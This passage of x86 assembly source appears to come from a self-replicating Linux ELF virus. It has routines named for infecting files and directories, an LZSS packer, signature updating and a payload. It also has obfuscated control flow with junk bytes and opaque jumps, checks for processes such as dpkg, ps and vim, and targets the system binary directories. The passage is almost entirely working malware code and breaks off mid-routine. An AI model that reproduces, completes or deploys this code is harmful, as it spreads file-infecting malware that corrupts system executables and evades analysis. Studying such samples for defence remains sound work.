    .index      resw 0x1
    .entry      resq 0x1
endstruc
struc _LZSSE_OFF
    .buffer     resb WINDOW_LENGTH*2
    .inputaddr  resq 0x1
    .outputaddr resq 0x1
    .saveoutptr resq 0x1
    .length     resq 0x1
    .buffersize resw 0x1
    .la_index   resw 0x1
    .w_index    resw 0x1
    .cmp_len    resb 0x1
    .match_pos  resw 0x1
    .match_len  resb 0x1
    .character  resb 0x1
    .bits       resb 0x1
    .mask       resb 0x1
endstruc
struc _UPDATASIG_OFF
    .signaddr   resq 0x1
    .index      resw 0x1
endstruc
struc _INFDIR_OFF
    .depth      resb 0x1
    .dirname    resq 0x1
    .dirfd      resd 0x1
    .dirbuf     resb DIRENT_BUFSIZE
    .dirnread   resq 0x1
    .dirindex   resq 0x1
    .buffer     resb 0x101*(SUBDIR_MAXDEPTH+1)
endstruc
struc _INFFILE_OFF
    .file       resb file_size
    .entry      resq 0x1
endstruc
struc _VADDR_OFF
    ._vaddr     resq 0x1
    .tmp_vaddr  resq 0x1
    .tmp_offset resq 0x1
endstruc
struc _DYNPIE_OFF
    .ptr        resq 0x1
    .sh_ptr     resq 0x1
    .shentsize  resw 0x1
    .shnum      resw 0x1
endstruc
;-----------------------------------------------------
; Packed & Encrypted variables.
VARIABLES packed
procdir:    db "/proc/", 0
status:     db "/status", 0

procs:
proc6:      db "dpkg", 0
proc5:      db "apt", 0
proc4:      db "ps", 0
proc3:      db "grep", 0
proc2:      db "cat", 0
proc1:      db "vim", 0
db 0x00

pwd_var:    db "PWD", 0

dirs_root:
bindir1:    db "/usr/local/sbin", 0
bindir2:    db "/usr/local/bin", 0
bindir3:    db "/usr/sbin", 0
bindir4:    db "/usr/bin", 0
bindir5:    db "/sbin", 0
bindir6:    db "/bin", 0
dirs_tmp:
test2:      db "/tmp/test2", 0
test:       db "/tmp/test", 0
db 0x00
;-----------------------------------------------------
; Packed & Encrypted code.
;-----------------------------------------------------
Processes:
    jmp         ..@kKsgl6LDvq91
..@rgefjWnk60U2:
    add         r1, 1
    jmp         ..@VaG5oao5Ygbw
..@8Zi0pp2FyfWv:
    lea         r1, [rsp+_PROC_OFF.buffer]
    mov         r2, [rsp+_PROC_OFF.dirname]
    jl          ..@o6eAyaB49r4z
    jge         ..@o6eAyaB49r4z
..@65Fxm98FmkTy:
    add         r5, rax
    js          ..@rvjagSC3Mr95
    jns         ..@rvjagSC3Mr95
..@Y3sATuHXbRQx:
    xor         r1, r1
    call_vsp    ExitProgram
    jmp         $+4
db 0x27, 0xa6
    jmp         ..@RzdPHosprkxK
..@NwxvB1837AfX:
    mov         r2, QWORD [r1+file.filename]
    mov         r4, r5
    and         r4, 10b
    jmp         $+5
db 0xb6, 0x35, 0x11
    jmp         $+5
db 0xaa, 0x25, 0x93
    jb          ..@VokoT8rXSPuX
    jae         ..@VokoT8rXSPuX
..@lfRBZa3XcGLF:
    mov         r5, QWORD [r4+rax+p_h.p_vaddr]
    add         r5, QWORD [r4+rax+p_h.p_memsz]
    cmp         r5, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
    jmp         $+4
db 0x65, 0x06
    js          ..@QeGQiCbTGazN
    jns         ..@QeGQiCbTGazN
..@uswTHaCXDIQL:
    ret
    jmp         IsELFComplete
..@rvjagSC3Mr95:
    sub         r5, 1
    jb          ..@z5p2uJ1zNGu7
    jae         ..@z5p2uJ1zNGu7
..@Iht8Y88RV8O2:
    xor         r2, r2
    xor         r3, r3
    jmp         $+3
db 0xbd
    jmp         ..@qt1I7nDQRdCR
..@EYt5me9UaoIq:
    mov         QWORD [r5+file.fileptr], rax
    jmp         $+3
db 0xde
    je          ..@FH0BkZoIzYyv
    jne         ..@FH0BkZoIzYyv
..@zuUZzEtE1oEc:
    mov         rdi, m6
    jmp         $+5
db 0xa2, 0x76, 0xe2
    jb          ..@j3OxBzfEmxF6
    jae         ..@j3OxBzfEmxF6
..@Gh6qy84A1IRn:
    call        Strcpy
    mov         BYTE [r1], '/'
    js          ..@zSgAQGSpaPx3
    jns         ..@zSgAQGSpaPx3
..@W82JEt0LdV91:
    add         rsp, _DYNPIE_OFF_size
    pop         r2
    jl          ..@Kqr5qSPMZRgl
    jge         ..@Kqr5qSPMZRgl
..@kmMqVhldp3u8:
    jz          ..@YGvCtyV1laIX
    cmp         BYTE [r1], 0x30
    jl          ..@TP3zax1Pdf2L
    jmp         $+3
db 0xe5
    js          ..@3cFjwW8DaFMl
    jns         ..@3cFjwW8DaFMl
..@MtBwkrQvV0d1:
    call        NonBinaryFile
    jmp         $+4
db 0xa0, 0x91
    jmp         ..@ULGNtgTzUOPR
..@7syp8lfBLtw1:
    jz          ..@F5GJP0OSwuvv
    jb          ..@8Zi0pp2FyfWv
    jae         ..@8Zi0pp2FyfWv
..@90lndXXin7rh:
    jmp         ..@W82JEt0LdV91
    jmp         ..@9mXnQCpM1lZS
..@R4FxM6IERCtl:
    xor         rax, rax
    ret
    je          NonBinaryFile
    jne         NonBinaryFile
..@s31trFTZGrWP:
    sub         rsi, m6
    mov         DWORD [rdi], esi
    jmp         ..@q9eb5rf39ywp
InfectionRoutine:
    jmp         ..@t3O3ODVmZ4pz
..@dhmtsbVaoyYs:
    GGLOBAL     _signature
    mov         r1, r5
    mov         r3, _signature.startsize
    jl          ..@8Pl9xDwNEDHe
    jge         ..@8Pl9xDwNEDHe
WORDToDWORDASCII:
    jmp         ..@ziSSMFPK2cam
..@vNTHFHVJc4Ve:
    or          QWORD [r1+e_h.e_entry], 1b
    jmp         ..@0oWYtjhg8wT9
..@QeGQiCbTGazN:
    jle         ..@qKg4vdRgo52V
    jmp         ..@lAgMhlZTPycy
..@T8hC4TMN2f7u:
%ifdef X86_32
    mov         edi, r1
%endif
    jmp         $+3
db 0x7a
    jmp         $+3
db 0xb1
    js          ..@DAodRufKxsoa
    jns         ..@DAodRufKxsoa
..@gdDKzjoZgtOS:
    rep         stosb
    jmp         $+3
db 0x5d
    jmp         $+5
db 0xf5, 0xf7, 0x4f
    jmp         $+4
db 0x94, 0x19
    js          ..@Rd58TJuBDh03
    jns         ..@Rd58TJuBDh03
..@UqoHUG7h3iVp:
    add         r2, r1
    jmp         ..@RZXLyxaffE48
..@FcWd8IQOLEut:
    and         r2, 1b
    jmp         $+5
db 0x00, 0x31, 0xd6
    jl          ..@l31929toBcuu
    jge         ..@l31929toBcuu
..@5pK2K35EwNbI:
    add         m7, rax
    js          ..@zuUZzEtE1oEc
    jns         ..@zuUZzEtE1oEc
..@mZiVHHiV3xzU:
    mov         r3, rax
    and         r3, 0xfff 
    mov         rbx, 0x1000
    jmp         ..@PcSPjRb5do1i
..@IdIyO6AfnuAn:
    and         ax, 1111b
    jmp         ..@eEJkBNoajoIV
..@KbYcrJwYLgG3:
    add         rdi, rcx
    add         rsi, rcx
    jmp         ..@xgrqprr9QNjF
..@VB1JQf5UfmqE:
    shl         edi, 0x8
    jmp         ..@QO2ioFcHPdap
..@PIKL46ekOib4:
    jle         ..@oz0w6dKg0d2f
    jmp         $+4
db 0x8a, 0x4f
    js          ..@ysMlpUVNjnx6
    jns         ..@ysMlpUVNjnx6
..@tt5pTdpoMGbi:
%ifdef X86_32
    mov         ecx, DWORD [edi+file.filesize]
%endif
    jmp         $+5
db 0xbc, 0x8a, 0xc8
    jmp         ..@tp01EptcftdQ
..@Niqdd0lU3Zu5:
    mov         r1, r4
    mov         rax, [r5+file.filesize]
    jmp         $+4
db 0x00, 0x7a
    jmp         $+3
db 0x80
    jb          ..@SjAA1cjKRDba
    jae         ..@SjAA1cjKRDba
..@7jK9ru52YNGT:
%ifdef X86_32
    xor         eax, eax
%endif
    jmp         $+4
db 0xdb, 0x7d
    je          ..@uOC73yUAKMYL
    jne         ..@uOC73yUAKMYL
..@0pDGmNIMMlxe:
    ret
    jmp         $+5
db 0x26, 0x55, 0xc4
    jmp         $+3
db 0x38
    jb          WORDToDWORDASCII
    jae         WORDToDWORDASCII
..@xY73kzQhpMQT:
    add         rsi, WINDOW_LENGTH
    rep         movsb
    sub         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH
    je          ..@kDdjOSsxIOp6
    jne         ..@kDdjOSsxIOp6
..@hvoRkrj9Z3zl:
    ret
    jmp         $+4
db 0xce, 0xd0
    jmp         $+4
db 0xec, 0x68
    jb          UpdateSignature
    jae         UpdateSignature
..@gL9qOJf82HFz:
    jle         ..@F5GJP0OSwuvv
    mov         DWORD [rsp+_PROC_OFF.filefd], eax
    RFILE       rax, [rsp+_PROC_OFF.buffer], 0x100
    jmp         ..@YGijnXnHzcof
..@M2BZ7QA3lU5h:
    lea         r1, QWORD [rsp+_INFFILE_OFF.file]
    call        FileValidation
    cmp         rax, 0x02
    jmp         $+5
db 0xe0, 0xdc, 0x75
    jmp         $+5
db 0x73, 0x70, 0xab
    jmp         $+4
db 0x76, 0xbc
    jl          ..@e051e89yAKXG
    jge         ..@e051e89yAKXG
..@Ny0Pgk64lueE:
    mov         r2, signature_len
    call        AddSizeMappedFile
    jmp         ..@X2XK3cqDiXZ3
..@FDTmGGmiDg17:
    jnz         ..@TrY8TMOOygZR
    jl          ..@My679AkxlRTY
    jge         ..@My679AkxlRTY
..@WX0eesBnV3cs:
%ifdef X86_64
    mov         eax, SYS_MMAP
%endif
    jmp         $+3
db 0x0e
    jmp         $+5
db 0x1a, 0x57, 0x74
    jmp         $+4
db 0xa1, 0x73
    jmp         ..@J4AoCAjHY5Y3
..@nTxJtYmQhjW8:
    call        WORDToDWORDASCII
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    jmp         $+3
db 0xce
    js          ..@rcCjuVt271rR
    jns         ..@rcCjuVt271rR
..@RLw7VHd5KSgN:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
    jmp         $+3
db 0xb4
    jmp         $+3
db 0xa1
    js          ..@Gh6qy84A1IRn
    jns         ..@Gh6qy84A1IRn
..@P0qnMkDF7Z4Q:
    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
    jmp         $+4
db 0xcf, 0x8a
    jmp         $+4
db 0x2c, 0x99
    je          ..@EwwXMTBBWSfX
    jne         ..@EwwXMTBBWSfX
..@91I78QCFUTJy:
    add         r1, non_packed_len+PADDING
    mov         r3, r1
    sub         r3, PADDING
    jmp         $+4
db 0x14, 0xe4
    jmp         ..@rzmYlC2dkt0q
..@F5fl1l2ePLuS:
    jmp         ..@vPMrJesYLSXe
    je          ..@vPMrJesYLSXe
    jne         ..@vPMrJesYLSXe
..@NLoRyrDfFi5i:
    jmp         ..@QPGIokYsnVu8
    jmp         ..@eDvIPiZixItI
..@u2671wA8w3oE:
    add         rsi, QWORD [rdi+s_h.sh_offset]
    jmp         $+3
db 0xef
    jmp         $+5
db 0xcf, 0x39, 0xd2
    je          ..@AT4Mi9T5InEx
    jne         ..@AT4Mi9T5InEx
..@Y7NtDm9eoh4u:
    mov         QWORD [rsp+_DYNPIE_OFF.ptr], r1
    jb          ..@w8VR0C2bgnQF
    jae         ..@w8VR0C2bgnQF
..@4bFPNOvGMuoE:
    mov         QWORD [r2+p_h.p_paddr], r3
    mov         QWORD [r2+p_h.p_filesz], r4
    mov         QWORD [r2+p_h.p_memsz], r4
    jmp         $+4
db 0x06, 0x32
    jmp         $+4
db 0xcd, 0x25
    jmp         $+5
db 0x75, 0x4e, 0x0c
    je          ..@5NbC2vKra5FA
    jne         ..@5NbC2vKra5FA
..@KpXu9MtZyJFz:
    cmp         rax, 0xffffffffffffffff
    je          ..@ViiT1xQWe48y
    jb          ..@XjgcM2fSOTIb
    jae         ..@XjgcM2fSOTIb
..@XpZ3fLZotp95:
    mov         edx, LOOKAHEAD_LENGTH
    cmp         ax, LOOKAHEAD_LENGTH
    cmovl       dx, ax
    jmp         $+4
db 0x1c, 0xe4
    jb          ..@f8MMphwCNwOe
    jae         ..@f8MMphwCNwOe
..@UCOARpXYYQaV:
    rep         movsb
    je          ..@Ac8oKpcozywR
    jne         ..@Ac8oKpcozywR
..@3IdYQ2ZFvaX2:
    mov         QWORD [r5+file.filesize], rax
    jb          ..@NjTnMfEK7Rpu
    jae         ..@NjTnMfEK7Rpu
..@ZzVbKnpg1EWo:
    pop         r1
    jmp         $+3
db 0xd4
    jmp         $+4
db 0xf9, 0xe5
    jmp         ..@0pDGmNIMMlxe
..@NX9BOq6k6dD6:
    ret
    jl          InfectFile
    jge         InfectFile
..@i6vKuDFjYDqp:
    add         r4, r3
    jmp         $+3
db 0xa1
    jmp         $+5
db 0xef, 0xc5, 0x94
    jmp         $+4
db 0x09, 0x71
    jmp         ..@cBMxW4sJqczX
..@VxA138Idaxwn:
    pop         r3
    pop         r2
    pop         r1
    js          ..@WKSwXRYiNmBV
    jns         ..@WKSwXRYiNmBV
..@tHjjQxPTE62q:
%ifdef X86_64
    xor         rax, rax
    xor         rdi, rdi
%endif
    jmp         $+4
db 0x5d, 0xf9
    js          ..@22PLG1gO79rZ
    jns         ..@22PLG1gO79rZ
..@j3OxBzfEmxF6:
    add         rdi, virus_len-_start
    jmp         ..@yIJugsBfnfCm
..@o6eAyaB49r4z:
    call        Strcpy
    lea         r2, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
    js          ..@h4CdhiZkNGku
    jns         ..@h4CdhiZkNGku
..@HmxzdvpnE7bh:
    mov         m7, rdi
    jmp         ..@5pK2K35EwNbI
..@J9s4u9Tbngej:
    pop         r4
    ret
    jb          UnmapFile
    jae         UnmapFile
..@4PTYO4XqPlDG:
    lea         r1, [rsp+_INFFILE_OFF.file]
    call        UnmapFile
    mov         r2, 11b
    jb          ..@wAMkOLKQilw4
    jae         ..@wAMkOLKQilw4
..@HuVTGdMto0ir:
    and         eax, 0xff
    or          edi, eax
    js          ..@V3Di2odKj8nx
    jns         ..@V3Di2odKj8nx
MemMove:
    jmp         ..@8N577lJvlwm9
..@J4AoCAjHY5Y3:
%ifdef X86_64
    syscall
%endif
    jmp         ..@RgYpBPPfuPHY
..@uMdi2HPmBtew:
    mov         r1, QWORD [r5+file.fileptr]
    mov         r2, QWORD [r5+file.filesize]
    jb          ..@eRWtE3wBUbL4
    jae         ..@eRWtE3wBUbL4
..@DAodRufKxsoa:
%ifdef X86_32
    mov         esi, r2
%endif
    jmp         $+4
db 0x75, 0x2e
    jb          ..@ARKp79bYIGkM
    jae         ..@ARKp79bYIGkM
..@zhU3qJ93gPC1:
    jmp         ..@qjamrc8Zkrya
    js          ..@1qvRUY99GgtH
    jns         ..@1qvRUY99GgtH
..@oRDoP9DAaATR:
    add         rsp, _UPDATASIG_OFF_size
    pop         r5
    pop         r4
    jl          ..@BOtHOiiC7u0U
    jge         ..@BOtHOiiC7u0U
..@LA5MkaFRvHa5:
    je          ..@gEK5sDBcQYmo
    jmp         $+4
db 0x5c, 0xfa
    je          ..@bMw3eRIC6lrR
    jne         ..@bMw3eRIC6lrR
..@NbtSBmqxXclB:
    syscall
    cmp         eax, 0x00
    jl          ..@RzdPHosprkxK
    jl          ..@wWabWtHX888k
    jge         ..@wWabWtHX888k
..@63uVPBpBSaNE:
    xor         r3, r3
    xor         r4, r4
    jmp         $+4
db 0x2b, 0x90
    jl          ..@549ARsO3O1OT
    jge         ..@549ARsO3O1OT
..@Rd58TJuBDh03:
    add         rsp, _PAYLOAD_OFF_size
    jmp         $+5
db 0x43, 0xb8, 0x7e
    jmp         $+5
db 0x0a, 0x65, 0x72
    jmp         ..@nU3RMRtn2ztW
..@3vQ1fz9XFZya:
    mov         r2, vsp
    je          ..@WSK8StwspNBB
    jne         ..@WSK8StwspNBB
..@8GmdO8WyLAZV:
    xor         rax, rax
    xor         r2, r2
    mov         r1, m6
    jmp         $+3
db 0x3f
    jb          ..@ffxxTpdtCFdh
    jae         ..@ffxxTpdtCFdh
..@zTfBb3vsAlu4:
    push        r1
    mov         r5, r1
    xor         rax, rax
    jmp         $+5
db 0x6a, 0x8a, 0x68
    jl          ..@uMdi2HPmBtew
    jge         ..@uMdi2HPmBtew
..@eDvIPiZixItI:
    xor         rax, rax
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    or          BYTE [rsp+_LZSSE_OFF.bits], al
    jmp         $+4
db 0x3a, 0x83
    jmp         $+3
db 0x57
    jmp         $+5
db 0xd6, 0xaf, 0x56
    jmp         ..@YtcnbgTDtOVG
..@oRIIsOKnwQqg:
    mov         ecx, WINDOW_LENGTH*2
    xor         rax, rax
    jmp         $+3
db 0x3a
    jmp         $+3
db 0xc9
    js          ..@PELDalgIzKzL
    jns         ..@PELDalgIzKzL
..@LBvF0a3A4JXs:
    add         r4, 1
    jmp         $+4
db 0x7a, 0x6b
    jmp         ..@WhpQIqB4Bbmo
..@UmJW36cAwyLW:
    xor         rax, rax
    jmp         $+3
db 0x09
    jmp         ..@Zq3kKy5r6JMo
..@cj9uaDZq2Jm5:
    cmp         BYTE [rsp+_LZSSE_OFF.match_len], MIN_LENGTH
    jge         ..@1qvRUY99GgtH
    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x1
    js          ..@UmJW36cAwyLW
    jns         ..@UmJW36cAwyLW
..@6yUGC7xASBts:
    ret
    js          LzssEncoder
    jns         LzssEncoder
..@yIJugsBfnfCm:
    mov         rsi, m7
    jl          ..@s31trFTZGrWP
    jge         ..@s31trFTZGrWP
..@549ARsO3O1OT:
    mov         r5, [rsp+_NBF_OFF.file]
    mov         r1, QWORD [r5+file.fileptr]
    jmp         ..@ceESOjpVmhyB
..@Ac8oKpcozywR:
    xor         rax, rax
    xor         r1, r1
    mov         r1w, WORD [rsp+_UPDATASIG_OFF.index] 
    jmp         $+4
db 0x0b, 0xd0
    jmp         ..@nTxJtYmQhjW8
..@UeDdX8n7MC9z:
    add         QWORD [rsp+_INFDIR_OFF.dirindex], rax
    jb          ..@gb8GclFahczY
    jae         ..@gb8GclFahczY
..@22onvSzSSWlU:
    add         r1, signature_len
    mov         r3, QWORD [r5+file.filesize]
    call        MemMove
    jmp         $+3
db 0x13
    jl          ..@8bhq8GrRkYyw
    jge         ..@8bhq8GrRkYyw
..@33Q4If3rtkYg:
    mov         r1, r5
    jmp         $+5
db 0x7c, 0x83, 0xca
    jmp         $+5
db 0x75, 0x34, 0x0a
    jl          ..@dsVUctmfwAjD
    jge         ..@dsVUctmfwAjD
..@JpUHAHTziuB7:
    mov         r4d, DWORD [r1 + file.filefd]
    mov         r5, r1
    jmp         $+5
db 0x05, 0x83, 0x98
    jl          ..@Niqdd0lU3Zu5
    jge         ..@Niqdd0lU3Zu5
..@qhz8z9q6qBDh:
%ifdef X86_32
    mov         edi, 0xffffffff
%endif
    jb          ..@3Jhbev2ZJEeL
    jae         ..@3Jhbev2ZJEeL
..@sN2zXiV0UFov:
    jl          ..@9vHlxQj499aM
    mov         r4, r5
    mov         r5, [rsp]
    jl          ..@LeSl1KImZMnY
    jge         ..@LeSl1KImZMnY
..@DzSAkiy6D7Fb:
    sub         rsp, _INFFILE_OFF_size
    mov         QWORD [rsp+_INFFILE_OFF.file+file.filename], r1
    lea         r1, [rsp+_INFFILE_OFF.file]
    js          ..@xLM2yX8Ho5Kt
    jns         ..@xLM2yX8Ho5Kt
..@tWtXJ5a7f5r8:
    CFILE       DWORD [rsp+_PROC_OFF.dirfd]
    jb          ..@E5hVQgUHALoU
    jae         ..@E5hVQgUHALoU
..@XaU1CGE0as4V:
    je          ..@GmHTSRd027zE
    jmp         $+4
db 0xbf, 0xd1
    jb          ..@VVBHaBlNihaD
    jae         ..@VVBHaBlNihaD
..@UTAheQLoudYG:
    ret
    jmp         $+3
db 0xd6
    jmp         ..@R4FxM6IERCtl
..@v5DUdKckfirm:
%ifdef X86_64
    mov         rcx, rdx
%endif
    jl          ..@T8hC4TMN2f7u
    jge         ..@T8hC4TMN2f7u
..@pmkghotGYKwD:
    xor         rax, rax
    mov         r3, [r1+e_h.e_phoff]
    lea         r4, [r1]
    jmp         $+5
db 0x5a, 0x15, 0x6f
    jmp         $+3
db 0x2d
    jb          ..@i6vKuDFjYDqp
    jae         ..@i6vKuDFjYDqp
..@p7ScmdMeeNVW:
    xor         rax, rax
    jmp         $+4
db 0x4f, 0x7d
    jmp         ..@az5roZGdhsEm
..@UsVfVNYvzoOb:
    jnz         ..@R4FxM6IERCtl
    jb          ..@XmSofxDnpzEy
    jae         ..@XmSofxDnpzEy
..@zHf20fCsNJWV:
    jz          ..@xcJAVtwS8bU8
    add         rax, 4
    jmp         $+4
db 0x77, 0x45
    jmp         ..@tfJb39ROecoI
..@TrY8TMOOygZR:
    VAR         packed, dirs_tmp
    jmp         $+5
db 0x8e, 0x94, 0xed
    jmp         ..@FvpNHFZl78ra
..@htprqlefq5Hb:
    mov         ecx, PADDING
    mov         eax, 0x00
    js          ..@gdDKzjoZgtOS
    jns         ..@gdDKzjoZgtOS
..@gEK5sDBcQYmo:
    mov         r1, QWORD [r5+file.fileptr]
    mov         r2, QWORD [r1+e_h.e_entry]
    jl          ..@m2l5jpkN32Ru
    jge         ..@m2l5jpkN32Ru
..@cTeLFbPfQDzc:
    mov         r2, m5
    jmp         $+5
db 0x30, 0x9a, 0x94
    jl          ..@CvDTA8oVitCy
    jge         ..@CvDTA8oVitCy
IsELFComplete:
    jmp         ..@nnfXH979z2cH
..@LWhXC9HX8Hwm:
    mov         r2, r1
    jmp         $+5
db 0xaa, 0xde, 0xe5
    jl          ..@22onvSzSSWlU
    jge         ..@22onvSzSSWlU
..@xfTPgyrccQWI:
    mov         rax, QWORD [rsi+rcx+bytes]
    and         rax, DF_1_PIE
    jmp         $+5
db 0x22, 0x60, 0x16
    jmp         $+5
db 0x50, 0x62, 0x2d
    jb          ..@oc8ckKAzxlXN
    jae         ..@oc8ckKAzxlXN
..@4ANICuqNYxxG:
    mov         r1, r5
    jmp         $+5
db 0xa0, 0xcb, 0x7e
    je          ..@M5X3BnBt52ar
    jne         ..@M5X3BnBt52ar
..@DF40Ye6VsElw:
    mov         ecx, WINDOW_LENGTH-LOOKAHEAD_LENGTH 
    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer] 
    jmp         $+5
db 0x80, 0x06, 0x84
    je          ..@igFgXO1vDWWG
    jne         ..@igFgXO1vDWWG
..@0P4QRNrdhrYo:
    add         r1, QWORD [r2]
    mov         QWORD [rsp+_DYNPIE_OFF.sh_ptr], r1
    xor         rbx, rbx
    jb          ..@IeWHdtvy0mkF
    jae         ..@IeWHdtvy0mkF
..@saqN5JMUfBgR:
    call        UpdateSignature
    mov         r1, m6
    je          ..@91I78QCFUTJy
    jne         ..@91I78QCFUTJy
..@XNvXzTJxKSFt:
    mov         dx, WORD [rsp] 
    jmp         $+3
db 0x29
    je          ..@VB1JQf5UfmqE
    jne         ..@VB1JQf5UfmqE
..@aHIbMhtktNDd:
    cmp         r4, 0x00
    jmp         $+5
db 0x61, 0x79, 0xb1
    jb          ..@PIKL46ekOib4
    jae         ..@PIKL46ekOib4
..@emjYrA44lYPe:
    lea         r1, [rsp+_INFFILE_OFF.file]
    jb          ..@X1ECtKy8btt0
    jae         ..@X1ECtKy8btt0
..@zSgAQGSpaPx3:
    add         r1, 1
    jmp         $+3
db 0x0d
    jmp         ..@ea6y2kJGRO6Q
..@7p3CvulN7ik3:
    push        r1
    jmp         $+4
db 0xfa, 0x00
    jmp         $+4
db 0x47, 0x78
    jmp         $+5
db 0xe8, 0xa8, 0x8b
    jmp         ..@CbT9Jb8MUQQ9
..@mHmEoXiu7NjD:
    mov         eax, 0x0
    jmp         $+3
db 0x1d
    jmp         $+5
db 0x72, 0x8b, 0x22
    jb          ..@dYfL5bIlrkXN
    jae         ..@dYfL5bIlrkXN
..@mLQhfk7cMGUC:
    add         r4, r3
    jl          ..@LBvF0a3A4JXs
    jge         ..@LBvF0a3A4JXs
..@9mXnQCpM1lZS:
    xor         rax, rax
    jmp         $+5
db 0x4e, 0x4e, 0xa0
    jmp         $+3
db 0x20
    jl          ..@W82JEt0LdV91
    jge         ..@W82JEt0LdV91
..@ksG3E592URJM:
    sub         rcx, rax
    jmp         ..@nb8j1yOPBjcj
..@GFM74VBidX4S:
    add         rdi, rax
    jmp         $+4
db 0x19, 0x21
    jmp         $+4
db 0xe4, 0x80
    jmp         ..@C1eZv0BFC7yJ
..@WKSwXRYiNmBV:
    cmp         QWORD m6, 0x00
    je          ..@oz0w6dKg0d2f
    cmp         QWORD m7, 0x00
    jmp         $+3
db 0x93
    js          ..@u01arBYN9hMA
    jns         ..@u01arBYN9hMA
..@ZP0tJIpC5Yac:
    cmp         rax, 0x00
    jle         ..@oz0w6dKg0d2f
    jmp         ..@zsh4RuWlDQCS
DestroyPayload:
    jmp         ..@53Mc727uXALt
..@2mxMqNlQBChT:
    ret
    js          IsNum
    jns         IsNum
..@YGijnXnHzcof:
    cmp         rax, 0x00
    jl          ..@5yXTzM9nOrnz
    xor         r4, r4
    jmp         ..@KJ91uacatmQI
..@q2kzdUowKCZP:
    xor         r1, r1
    jmp         $+4
db 0x52, 0x0a
    js          ..@5Nm77R9P6Ml5
    jns         ..@5Nm77R9P6Ml5
..@558pDbgxYslW:
    xor         rax, rax
    xor         rdi, rdi
    jmp         $+3
db 0x5e
    jmp         $+4
db 0x39, 0x44
    jmp         ..@Ni2CGNpMTv9e
..@t3O3ODVmZ4pz:
    mov         QWORD m5, 0x01
    push        0x00
    jmp         $+5
db 0x6f, 0xa1, 0x00
    js          ..@SxuJviyzmB6d
    jns         ..@SxuJviyzmB6d
..@uvKPMbLEa5kL:
    add         rdi, non_packed_len
    jmp         $+4
db 0xc7, 0x6a
    jmp         $+4
db 0x39, 0x6e
    jmp         ..@HmxzdvpnE7bh
..@Kqr5qSPMZRgl:
    pop         r3
    jmp         ..@Ie6t8FunBGSt
..@Owf8jAwl3pU1:
    mov         ax, WORD [r5+linux_dirent.d_reclen]
    jb          ..@65Fxm98FmkTy
    jae         ..@65Fxm98FmkTy
..@vnhlexeQjq4t:
    and         r2, 0x00ffffff
    cmp         r2d, '../'
    je          ..@cGP4eVS9c0f1
    jmp         $+5
db 0xe8, 0x37, 0x0b
    jmp         $+4
db 0xb1, 0xe3
    js          ..@HHMH1QTmd0ga
    jns         ..@HHMH1QTmd0ga
..@NMPApKGAWw8J:
    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    inc         QWORD [rsp+_LZSSE_OFF.outputaddr] 
    jmp         $+5
db 0xcc, 0x74, 0x53
    jmp         ..@deLH2ZVwwuI3
..@c5UJBFEtM3SR:
    cmp         cl, 0x4
    jl          ..@VB1JQf5UfmqE
    jmp         $+3
db 0x82
    jl          ..@aqQJId3DOxJd
    jge         ..@aqQJId3DOxJd
..@ysMlpUVNjnx6:
    push        r1
    push        r2
    jl          ..@SqoLC1wbJHvN
    jge         ..@SqoLC1wbJHvN
..@dsVUctmfwAjD:
    add         r1, r4
    cmp         BYTE [r1], 0x00
    je          ..@5yXTzM9nOrnz
    js          ..@nl4gVcKkxDzt
    jns         ..@nl4gVcKkxDzt
..@ooCeATET1k6E:
    je          ..@cGP4eVS9c0f1
    jmp         $+5
db 0xfe, 0x2c, 0x87
    jmp         $+5
db 0x98, 0x75, 0x50
    jmp         $+5
db 0x89, 0x58, 0x8a
    jb          ..@nCZuxecWubzp
    jae         ..@nCZuxecWubzp
..@8E6n7NgFN6PI:
    push        r4
    jmp         ..@T2aQ8F6bVsjc
..@8N577lJvlwm9:
    push        r4
    push        r5
    jmp         $+4
db 0x11, 0x71
    je          ..@KaLksZ5wSH74
    jne         ..@KaLksZ5wSH74
InfectDirectory:
    jmp         ..@mkEbUBw5QjK2
..@pXOpto1Nenc7:
    mov         rax, r4
    movzx       r3, WORD [r1+e_h.e_phentsize]
    jmp         $+4
db 0xd0, 0xef
    jmp         $+3
db 0x83
    je          ..@MlSzyU5l2RYt
    jne         ..@MlSzyU5l2RYt
..@vPMrJesYLSXe:
    xor         rax, rax
    jb          ..@P0qnMkDF7Z4Q
    jae         ..@P0qnMkDF7Z4Q
..@SqoLC1wbJHvN:
    push        r3
    js          ..@LZ5jIelEW7yJ
    jns         ..@LZ5jIelEW7yJ
..@0oWYtjhg8wT9:
    lea         r1, [rsp+_INFFILE_OFF.file]
    mov         r2, r4
    js          ..@1vYdz2IxqmUj
    jns         ..@1vYdz2IxqmUj
..@8OqqD9iVOi9f:
%ifdef X86_64
    syscall
%endif
    jb          ..@KpXu9MtZyJFz
    jae         ..@KpXu9MtZyJFz
..@m2l5jpkN32Ru:
    test        r2, r2
    jz          ..@R4FxM6IERCtl
    jmp         ..@FcWd8IQOLEut
..@o23wt7vYA5Cr:
    mov         BYTE [r1], 0x00
    jmp         ..@ljb9zJ1jAXr6
..@B8ejZoBIydNL:
    lea         r1, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    cmp         BYTE [r1], '.'
    je          ..@LYYdE28N9k6i
    jne         ..@LYYdE28N9k6i
..@l31929toBcuu:
    test        r2, r2
    jmp         $+4
db 0xb6, 0x79
    jl          ..@ScIVejNrJtUP
    jge         ..@ScIVejNrJtUP
..@TFIJ1m0WvM70:
    mov         r1, QWORD [rsp+_INFFILE_OFF.file+file.fileptr]
    add         r1, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
    jmp         ..@9sFjqZXTAW8V
..@NOnmaeYF4hkj:
    sub         rsp, _NBF_OFF_size
    mov         WORD [rsp+_NBF_OFF.index], r2w
    mov         QWORD [rsp+_NBF_OFF.file], r1
    jmp         $+5
db 0xa3, 0x7b, 0xfa
    jmp         $+5
db 0x0a, 0x09, 0x43
    jmp         $+3
db 0x09
    jl          ..@B6iOLoxgCiSm
